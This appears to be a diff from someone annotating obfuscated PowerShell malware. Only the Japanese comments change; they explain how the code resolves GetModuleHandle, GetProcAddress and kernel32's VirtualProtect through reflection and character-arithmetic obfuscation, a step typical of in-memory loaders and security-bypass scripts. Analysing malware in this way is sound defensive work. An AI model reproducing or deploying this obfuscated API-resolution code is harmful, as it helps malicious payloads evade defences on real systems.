@@ -137,8 +137,8 @@ FUncTIon Get-PZ2zmpurexnDXVSxx {
             $IqnMnVucT+=$_
         }
     }
-#「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,引数のDLL)」を実行し引数のDLLのハンドルを取得
-# System.dllの「GetProcAddress」で、引数のDLLの引数プロセス名のアドレスを取得
+#「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,引数DLL名)」を実行し引数DLLのハンドルを取得
+# System.dllの「GetProcAddress」で、引数DLLの引数プロセス名のアドレスを取得
     return $IqnMnVucT[0].Invoke($null, @(($IObr8mVbBcalgmD.GetMethod(""+[char]([BYtE] 0x96-0x4f)+[ChaR]([BytE] 0xbb-0x56)+[cHar](5090-4974)+[CHar](7341-7264)+"odul"+[cHaR]([byte] 0xa8-0x43)+[ChAr](1345-1273)+[cHAR](1128-1031)+[cHAr](8032-7922)+"dle")).Invoke($null, @($ljOHgifgLteNDYGV)), $HWN81YY7isiEXwOd))
 
 }
@@ -180,7 +180,7 @@ FUncTIon Get-iy2kysa7yS {
 #jump
 $N7IBEcG01XRRln = 0
 #jump
-# Get-PZ2zmpurexnDXVSxx
+# 「Get-PZ2zmpurexnDXVSxx $kernel32.dll  VirtualProtect」でk「VirtualProtect」プロセスのアドレスを取得
 $knBIRuLz=[SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::GETDElEgaTEForFUNCtionPOiNTeR(
     (Get-PZ2zmpurexnDXVSxx $(""+[ChAR](577-470)+[ChaR](2547-2446)+[cHar](5679-5565)+[chAr](6260-6150)+[cHAr](4851-4750)+[ChAr](3338-3230)+[char](9887-9836)+[Char]([bYTe] 0x77-0x45)+[CHAR](4271-4225)+[cHar](7885-7785)+[cHAR]([bytE] 0xdc-0x70)+[ChAR](1500-1392)+"") VirtualProtect), 
     (Get-iy2kysa7yS @([IntPtr], [UInt32], [UInt32], [UInt32].MAkeBYREFTypE()) ([Bool]))
